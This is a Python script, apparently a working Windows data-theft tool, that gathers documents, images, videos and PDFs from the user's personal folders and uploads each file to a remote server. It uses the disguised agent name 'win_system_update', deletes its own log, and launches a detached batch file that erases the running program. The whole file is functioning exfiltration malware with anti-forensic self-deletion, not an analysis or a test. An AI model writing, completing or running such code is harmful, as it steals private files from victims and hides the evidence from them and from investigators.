import os
import time
import requests
import glob
import sys
import subprocess # For self-destruction

# Hardcode URL as requested
SERVER_URL = "https://tu-app.up.railway.app" # User needs to replace with actual Railway app URL
UPLOAD_ENDPOINT = f"{SERVER_URL}/api/upload"

# Log function for file logging
def log(message):
    try:
        with open('sync_log.txt', 'a') as f:
            f.write(f'[{time.ctime()}] {message}
')
    except Exception as e:
        print(f"Error writing to log file: {e}") # Print error to console if file logging fails

def run_exfiltration():
    print('Buscando archivos...') # Debug print
    log("Starting file exfiltration...")

    user_profile = os.environ.get('USERPROFILE', '')
    targets = [
        os.path.join(user_profile, 'Downloads'),
        os.path.join(user_profile, 'Pictures'),
        os.path.join(user_profile, 'Videos'),
        os.path.join(user_profile, 'Documents')
    ]
    
    extensions = ['*.txt', '*.jpg', '*.png', '*.mp4', '*.pdf']
    
    for folder in targets:
        if not os.path.exists(folder): 
            log(f"Directory not found: {folder}. Skipping.")
            print(f"Directory not found: {folder}. Skipping.") # Debug print
            continue
        
        for ext in extensions:
            for file_path in glob.glob(os.path.join(folder, ext)):
                try:
                    # 1. Verificar si el archivo ya existe en el servidor
                    check_response = requests.get(f"{SERVER_URL}/api/check-file", params={
                        'agentId': 'win_system_update', # Use a fixed agent ID for this ephemeral agent
                        'filename': os.path.basename(file_path)
                    }, timeout=5)
                    
                    if check_response.status_code == 200 and check_response.json().get('exists'):
                        log(f"File {file_path} already exists on server. Skipping.")
                        print(f"File {file_path} already exists on server. Skipping.") # Debug print
                        continue 

                    # 2. Subir si es nuevo y no muy grande
                    if os.path.getsize(file_path) > 50 * 1024 * 1024:
                        log(f"Skipping large file: {file_path}")
                        print(f"Skipping large file: {file_path}") # Debug print
                        continue
                    
                    with open(file_path, 'rb') as f:
                        print(f'Enviando a {UPLOAD_ENDPOINT}...') # Debug print
                        files_payload = {'file': (os.path.basename(file_path), f.read())}
                        response = requests.post(UPLOAD_ENDPOINT, files=files_payload, data={'agentId': 'win_system_update'}, timeout=10)
                    
                    print(f'Respuesta: {response.status_code}') # Debug print
                    if response.status_code == 200:
                        log(f"Successfully exfiltrated {file_path}")
                        print(f"Successfully exfiltrated {file_path}") # Debug print
                    else:
                        log(f"Failed to exfiltrate {file_path}: HTTP {response.status_code} - {response.text}")
                        print(f"Failed to exfiltrate {file_path}: HTTP {response.status_code} - {response.text}") # Debug print
                except requests.exceptions.Timeout:
                    log(f"Timeout exfiltrating {file_path}. Server did not respond in time.")
                    print(f"Timeout exfiltrating {file_path}. Server did not respond in time.") # Debug print
                except requests.exceptions.RequestException as req_err:
                    log(f"Network error exfiltrating {file_path}: {req_err}")
                    print(f"Network error exfiltrating {file_path}: {req_err}") # Debug print
                except Exception as e:
                    log(f"Error processing/exfiltrating {file_path}: {e}")
                    print(f"Error processing/exfiltrating {file_path}: {e}") # Debug print

    log("File exfiltration complete.")
    print("Exfiltration complete.") # Debug print

    # Self-cleanup: Delete sync_log.txt
    if os.path.exists('sync_log.txt'):
        try:
            os.remove('sync_log.txt')
            print("sync_log.txt removed.")
        except Exception as e:
            print(f"Error removing sync_log.txt: {e}")

if __name__ == "__main__":
    run_exfiltration()
    
    # Self-destruction routine
    executable_path = sys.argv[0]
    if sys.platform == "win32":
        # Create a batch script to delete the running executable after a delay
        cleanup_script_content = f"""
        @echo off
        timeout /t 5 /nobreak > NUL
        del /f /q "{executable_path}"
        exit
        """
        cleanup_script_path = os.path.join(os.path.dirname(executable_path), "cleanup.bat")
        
        try:
            with open(cleanup_script_path, "w") as f:
                f.write(cleanup_script_content)
            # Start the batch script and detach it
            subprocess.Popen(['cmd.exe', '/c', cleanup_script_path], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
            print(f"Self-destruction initiated for {executable_path}")
        except Exception as e:
            print(f"Error initiating self-destruction: {e}")
    else:
        print(f"Self-destruction not implemented for non-Windows platform ({sys.platform})")

    sys.exit(0) # Exit immediately after completion
